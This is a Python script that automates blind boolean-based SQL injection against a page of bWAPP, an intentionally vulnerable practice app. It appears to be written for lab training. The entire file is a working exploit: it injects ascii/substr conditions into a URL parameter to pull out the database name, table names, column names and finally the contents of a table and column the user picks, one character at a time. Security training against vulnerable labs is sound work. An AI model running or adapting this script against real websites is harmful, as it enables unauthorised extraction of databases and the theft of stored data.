import requests
import re

var=""
url="http://169.254.4.108/bWAPP/sqli_10-1.php?title=";

#Finding the database length
for l in range(1,100):
	req=requests.get(url+"1' AND (length(database())="+str(l)+")--+")
	res=req.text 	
	tmp=re.findall("You are in",res)
	if tmp:
		print "Length : "+ str(l) 

#For finding the database name
for i in range(1,l):
	for j in range(20,123):
		req=requests.get(url+"1' AND (ascii(substr((select database()),"+str(i)+",1))="+str(j)+")--+");
		res=req.text;
		temp=re.findall("You are in",res);
		if temp:	
			var+=chr(j)
			break;
print "Database Name: " + str(var)

#Table name 
tab=""
val=""
for i in range(0,9):
	for j in range(1,10):
		for k in range(20,123):
			req=requests.get(url+"1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(i)+",1),"+str(j)+",1)))="+str(k)+"--+");
			res=req.text;
			temp=re.findall("You are in",res);
			if temp:
				tab+=chr(k)
				break;
	if tab=="":
		break;
	print "Table name:"+str(tab)
#Table details
	for m in range(1,10): 
		for j in range(1,10):
        	        for k in range(20,123):
                	    	 req=requests.get(url+"1' AND (ascii(substr((select column_name from information_schema.columns where table_name='"+tab+"' limit "+str(m)+",1),"+str(j)+",1)))="+str(k)+"--+");
                       		 res=req.text;
                       		 temp=re.findall("You are in",res);
                       		 if temp:
                        	        val+=chr(k)
                                	break;
		if val=="":
			break;
		print str(m)+"."+str(val)
		val=""
	tab=""
table=raw_input("\nEnter the name of the table:");
column=raw_input("Enter the column :");
resu=""

for i in range(0,10):
	for j in range(1,10):
		for k in range(20,123):
			req=requests.get(url+"1' AND (ascii(substr((select "+column+" from "+ table +" limit "+str(i)+",1),"+str(j)+",1)))="+str(k)+"--+");
			res=req.text;
			temp=re.findall("You are in",res);
			if temp:	
				resu+=chr(k)
				break;
	if resu=="":
		break;
	print str(i)+"."+str(resu)
	resu=""


